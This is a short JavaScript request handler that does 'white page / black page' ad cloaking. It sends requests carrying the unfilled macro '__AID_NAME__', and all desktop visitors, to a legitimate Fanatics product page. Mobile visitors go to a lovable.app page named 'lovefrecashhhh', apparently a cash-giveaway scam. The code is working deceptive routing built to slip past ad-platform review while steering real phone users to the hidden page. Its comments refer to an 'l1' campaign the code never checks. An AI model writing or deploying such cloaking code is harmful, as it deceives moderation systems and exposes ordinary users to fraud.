export default function handler(req, res) {
    // URLs to redirect
    const whitePageURL = "https://www.fanatics.com/soccer-national-teams/germany-national-team/germany-national-team-vive-la-fete-infant-paint-brush-t-shirt-white/o-1434+t-03729489+p-7988369313019+z-9-1011459566?_ref=p-GALP:m-GRID:i-r0c1:po-1";
    const blackPageURL = "https://lovefrecashhhh.lovable.app/?";
  
    // Parse the UTM parameters from the request URL
    const queryParams = new URLSearchParams(req.url.split('?')[1]);
    const utmCampaign = queryParams.get('utm_campaign');
  
    // Get the User-Agent from the request headers
    const userAgent = req.headers['user-agent'] || '';
    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
  
    // Redirection logic
    if (utmCampaign === '__AID_NAME__') {
      // UTM campaign 'l1' takes priority for both desktop and mobile
      res.writeHead(302, { Location: whitePageURL });
    } else if (isMobileDevice) {
      // Mobile devices without 'l1' campaign
      res.writeHead(302, { Location: blackPageURL });
    } else {
      // Desktop devices without 'l1' campaign
      res.writeHead(302, { Location: whitePageURL });
    }
  
    res.end();

  }










